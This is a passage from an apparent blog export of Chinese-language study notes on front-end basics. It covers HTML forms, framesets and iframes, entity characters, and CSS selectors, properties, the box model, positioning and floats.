class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						邮箱</span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span>	</span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;普通输入框&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">					</span><br><span class="line">				<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span>上传头像<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					</span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						备注</span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span>&gt;</span></span><br><span class="line">							write down your list</span><br><span class="line">						<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						</span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;普通按钮&quot;</span> /&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重置&quot;</span> /&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						</span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;image&quot;</span> <span class="attr">src</span>=<span class="string">&quot;btn.gif&quot;</span> /&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20190101&quot;</span> /&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				</span><br><span class="line">			<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="三、html框架"><a href="#三、html框架" class="headerlink" title="三、html框架"></a>三、html框架</h2><p>frameset 属性 rows/cols 划分格式： rows=”120,*”</p>
<p>*表示其他</p>
<p>frame  ：name/src</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">frameset</span> <span class="attr">rows</span>=<span class="string">&quot;120,450,*&quot;</span> <span class="attr">border</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">frame</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">frameset</span> <span class="attr">cols</span>=<span class="string">&quot;120,*&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">frame</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">frame</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;http://www.qq.com&quot;</span> &gt;</span>&lt;/frame/&gt;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>iframe</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>内部框架<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="四、特殊字符"><a href="#四、特殊字符" class="headerlink" title="四、特殊字符"></a>四、特殊字符</h2><p>&amp;nbsp:空格、&amp;qt：大于号 &amp;lt小于号、&amp;copy版权符号 、&amp;reg注册符号</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		首页<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;nbsp;</span>旅游<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;lt;</span>图书列表</span><br><span class="line">		<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">			<span class="symbol">&amp;copy;</span>copyright 广州<span class="symbol">&amp;reg;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">©copyright 广州®</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>css</title>
    <url>/2020/09/11/02CSS/</url>
    <content><![CDATA[<h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><h3 id="1、什么是CSS"><a href="#1、什么是CSS" class="headerlink" title="1、什么是CSS"></a>1、什么是CSS</h3><p><strong>层叠样式表</strong>，cascade style sheet进行样式修饰语言</p>
<p>层叠，不同的CSS样式对同一个html标签进行修饰，冲突的让步优先级高的，不冲突则共同作用</p>
<p>样式表，css属性样式的集合</p>
<h3 id="2、引入CSS"><a href="#2、引入CSS" class="headerlink" title="2、引入CSS"></a>2、引入CSS</h3><h4 id="（1）内嵌样式"><a href="#（1）内嵌样式" class="headerlink" title="（1）内嵌样式"></a>（1）内嵌样式</h4><p>将CSS代码嵌入到HTML标签中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:red;font-size: 100px;&quot;</span>&gt;</span>你好啊 小朋友<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="（2）内部样式"><a href="#（2）内部样式" class="headerlink" title="（2）内部样式"></a>（2）内部样式</h4><p>在head标签中使用style标签进行CSS的引入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line">		div&#123;</span><br><span class="line">			color: red;</span><br><span class="line">			font-size: 100px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<h4 id="（3）外部样式"><a href="#（3）外部样式" class="headerlink" title="（3）外部样式"></a>（3）外部样式</h4><p>Link 标签，引用外部CSS文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;1.css&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3、选择器"><a href="#3、选择器" class="headerlink" title="3、选择器"></a>3、选择器</h3><h4 id="（1）基本选择器"><a href="#（1）基本选择器" class="headerlink" title="（1）基本选择器"></a>（1）基本选择器</h4><p><strong>根据id、类、标签进行选择</strong></p>
<p><strong>优先级</strong>：<strong>选择器的优先级：id&gt;class&gt;元素</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//类选择</span><br><span class="line">.style1&#123;</span><br><span class="line">	background-color: black;</span><br><span class="line">    &#125;</span><br><span class="line">//id选择</span><br><span class="line">    #div3&#123;</span><br><span class="line">    background-color: orange;</span><br><span class="line">    &#125;</span><br><span class="line">//标签选择</span><br><span class="line">    div&#123;</span><br><span class="line">    background-color: saddlebrown;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;style1&quot;</span>&gt;</span>hello css1!!!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="（2）属性选择器"><a href="#（2）属性选择器" class="headerlink" title="（2）属性选择器"></a>（2）属性选择器</h4><p>格式：基本选择器[属性=‘属性值’]{css属性}</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 属性选择器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span>&#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">background-color</span>: <span class="selector-id">#FFA500</span>;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;&quot;</span> <span class="attr">cellpadding</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    		name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    		密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line">    		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="（3）伪元素选择器"><a href="#（3）伪元素选择器" class="headerlink" title="（3）伪元素选择器"></a>（3）伪元素选择器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 伪元素选择器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="comment">/* 静止状态 */</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;</span></span><br><span class="line">        color: red;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="comment">/* 悬浮状态 */</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">color</span><span class="selector-pseudo">:blue</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="comment">/* 触发状态 */</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">color</span><span class="selector-pseudo">:greenyellow</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="comment">/* 完成状态 */</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">color</span><span class="selector-pseudo">:green</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="（4）层级选择器"><a href="#（4）层级选择器" class="headerlink" title="（4）层级选择器"></a>（4）层级选择器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 层级（后代）选择器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#div2</span> <span class="selector-class">.dd1</span>&#123;</span></span><br><span class="line">        color: orange;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">		</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;dd1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>111<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;dd2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>122<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3、css属性"><a href="#3、css属性" class="headerlink" title="3、css属性"></a>3、css属性</h3><h4 id="（1）文字属性"><a href="#（1）文字属性" class="headerlink" title="（1）文字属性"></a>（1）文字属性</h4><p><strong>font</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">color</span><span class="selector-pseudo">:red</span>;   <span class="comment">/* 字体颜色 */</span></span><br><span class="line"><span class="selector-tag">font-size</span>: <span class="selector-tag">small</span>;  <span class="comment">/* 字体大小 */</span></span><br><span class="line"><span class="selector-tag">font-family</span>: 黑体;  <span class="comment">/* 字体类型 */</span></span><br><span class="line"><span class="selector-tag">font-style</span>: <span class="selector-tag">italic</span>;  <span class="comment">/* 字体风格 */</span>				</span><br><span class="line"><span class="selector-tag">font-weight</span>: 100; <span class="comment">/* 加粗 */</span></span><br><span class="line"><span class="selector-tag">word-spacing</span>: 2<span class="selector-tag">em</span>;  <span class="comment">/* 单词间距 */</span></span><br><span class="line"><span class="selector-tag">letter-spacing</span>: 2<span class="selector-tag">em</span>; <span class="comment">/* 字符间距 */</span></span><br></pre></td></tr></table></figure>

<h4 id="（2）文本属性"><a href="#（2）文本属性" class="headerlink" title="（2）文本属性"></a>（2）文本属性</h4><p><strong>text</strong>-decoration:下划线underline 、none</p>
<p>text-align：水平对齐方式</p>
<p>text-indent:缩进</p>
<p>line-height: 行高</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">			<span class="selector-tag">p</span>&#123;</span><br><span class="line">				<span class="attribute">text-indent</span>: <span class="number">2em</span>;<span class="comment">/* 缩进 */</span></span><br><span class="line">				<span class="attribute">line-height</span>: <span class="number">2.25rem</span>;  <span class="comment">/* 行高 */</span></span><br><span class="line">			&#125;</span><br><span class="line">&lt;/<span class="selector-tag">style</span>&gt;</span><br></pre></td></tr></table></figure>

<h4 id="（3）背景颜色"><a href="#（3）背景颜色" class="headerlink" title="（3）背景颜色"></a>（3）背景颜色</h4><p><strong>background</strong>-color</p>
<p>background-image： url(“图片地址”)</p>
<p>background-<strong>repeat</strong>:平铺方式  repeat:横向纵向平铺，no-repeat,repeat-x,repeat-y</p>
<h4 id="（4）列表属性"><a href="#（4）列表属性" class="headerlink" title="（4）列表属性"></a>（4）列表属性</h4><p>list-style-type：none；</p>
<p>list-style-image url(“图片地址”)</p>
<p>list-style-<strong>position</strong>: outside(默认)，inside</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line">			ul li&#123;</span><br><span class="line"><span class="css">				<span class="comment">/* 无序列表的排序图标 */</span></span></span><br><span class="line">				/* list-style-type: upper-roman;</span><br><span class="line">				list-style-type: none; */</span><br><span class="line"><span class="css">				  <span class="selector-tag">list-style-image</span>: <span class="selector-tag">url</span>(../<span class="selector-tag">MyHtml</span>/<span class="selector-tag">image</span>/2<span class="selector-class">.png</span>);</span></span><br><span class="line">				  list-style-position: inside;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="（5）尺寸属性"><a href="#（5）尺寸属性" class="headerlink" title="（5）尺寸属性"></a>（5）尺寸属性</h4><p>width,height</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line">			p&#123;</span><br><span class="line">				width: 800px;</span><br><span class="line">				height: 5rem;</span><br><span class="line"><span class="css">				<span class="selector-tag">background-color</span>: <span class="selector-id">#FFA500</span>;</span></span><br><span class="line">				//设置行高和文本高一致，可使得行位于中间</span><br><span class="line">				line-height: 5rem;</span><br><span class="line">				text-align: center;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="（6）显示属性"><a href="#（6）显示属性" class="headerlink" title="（6）显示属性"></a>（6）显示属性</h4><p><strong>display</strong>: <strong>none</strong>隐藏,<strong>block</strong>(块级显示)，<strong>inline</strong>(行级显示)</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">        <span class="comment">/* 	块级变行级 */</span></span><br><span class="line">        <span class="comment">/* display: inline; */</span></span><br><span class="line">        <span class="attribute">background-color</span>: pink;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">   &#125;	</span><br><span class="line">   <span class="comment">/* 行级变块级 */</span></span><br><span class="line">   <span class="selector-tag">span</span>&#123;</span><br><span class="line">       <span class="attribute">display</span>: block;</span><br><span class="line">       <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">       <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">       <span class="attribute">background-color</span>: pink;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="4、盒子模型"><a href="#4、盒子模型" class="headerlink" title="4、盒子模型"></a>4、盒子模型</h3><h4 id="border边框"><a href="#border边框" class="headerlink" title="border边框"></a>border边框</h4><p>border-width、border-color、border-style、三合一border:10px solid red;</p>
<p>border-top/bottom/left/right</p>
<h4 id="padding内部"><a href="#padding内部" class="headerlink" title="padding内部"></a>padding内部</h4><p>padding:10px 代表上下左右都是10px</p>
<p>padding:1px 2px 3px 4px</p>
<p>padding: 1px 2px;  上下/左右</p>
<p>padding：1px 2px 3px; padding-top;单独设置</p>
<h4 id="margin外部"><a href="#margin外部" class="headerlink" title="margin外部"></a>margin外部</h4><p>代表边框外壁与其他元素之间的距离</p>
<p>margin:10px</p>
<p>同上！</p>
<h3 id="5、浮动"><a href="#5、浮动" class="headerlink" title="5、浮动"></a>5、浮动</h3><h4 id="（1）定位"><a href="#（1）定位" class="headerlink" title="（1）定位"></a>（1）定位</h4><p><strong>position</strong>  相对定位<strong>relative</strong> , 绝对定位<strong>absolute</strong> , 固定定位<strong>fixed</strong></p>
<p>多个祖先的绝对定位采用<strong>就近原则</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*//相对定位参照物:相对于它自已原来的位置,不脱离标准流，原来位置不会被其他元素占领*/</span></span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line">	<span class="attribute">background-color</span>: skyblue;			</span><br><span class="line">	<span class="attribute">position</span>: relative;</span><br><span class="line"><span class="comment">/*相对与浏览器 </span></span><br><span class="line"><span class="comment">绝对定位若是父亲定位过，则参照物就变成了父亲，而不是浏览器</span></span><br><span class="line"><span class="comment">多级父亲都已被定位过，则就近原则</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	<span class="attribute">position</span>: absolute;</span><br><span class="line">	<span class="attribute">left</span>: <span class="number">20px</span>;</span><br><span class="line">	<span class="attribute">top</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fixed固定定位用于链接返回固定位置</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.backtop&#123;</span><br><span class="line">	position: fixed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;backtop&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>返回<span class="tag">&lt;<span class="name">br</span> /&gt;</span>顶部<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;2.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;2.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;2.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;2.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="（2）消除浮动"><a href="#（2）消除浮动" class="headerlink" title="（2）消除浮动"></a>（2）消除浮动</h4><p>​    clear:both</p>
<h4 id="（3）z-index"><a href="#（3）z-index" class="headerlink" title="（3）z-index"></a>（3）z-index</h4><p>设置顶层或底层,可用于将在一个元素放置于另一元素之后。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">background</span>: skyblue;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">180px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">180px</span>;</span><br><span class="line"><span class="attribute">z-index</span>: <span class="number">1</span>;				</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="（4）列表浮动"><a href="#（4）列表浮动" class="headerlink" title="（4）列表浮动"></a>（4）列表浮动</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line">			*&#123;</span><br><span class="line">				margin: 0px;</span><br><span class="line">				padding: 0rem;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line"><span class="css">			<span class="selector-class">.nav</span>&#123;</span></span><br><span class="line">				position: fixed;</span><br><span class="line">				width: 960px;</span><br><span class="line">				height: 50px;</span><br><span class="line">				border: 1px red solid;</span><br><span class="line">				margin: 100px 100px;  //居中</span><br><span class="line">			&#125;</span><br><span class="line"><span class="css">			<span class="selector-class">.nav</span> <span class="selector-tag">ul</span>&#123;</span></span><br><span class="line">				list-style-type: none;</span><br><span class="line">			&#125;</span><br><span class="line"><span class="css">			<span class="selector-class">.nav</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line">				float: left;				</span><br><span class="line">				text-align: center;</span><br><span class="line">				height: 50px;</span><br><span class="line">				width: 120px;</span><br><span class="line"><span class="css">				<span class="selector-tag">line-height</span>: 50<span class="selector-tag">px</span>;  <span class="comment">/* 文字垂直居中 */</span></span></span><br><span class="line">				</span><br><span class="line">			&#125;			</span><br><span class="line"><span class="css">			<span class="selector-class">.nav</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">				text-decoration: none;</span><br><span class="line">				display: block;</span><br><span class="line">				background-color: purple;</span><br><span class="line"><span class="css">				<span class="selector-tag">color</span><span class="selector-pseudo">:black</span>;			</span></span><br><span class="line">			&#125;</span><br><span class="line"><span class="css">			<span class="selector-class">.nav</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span><span 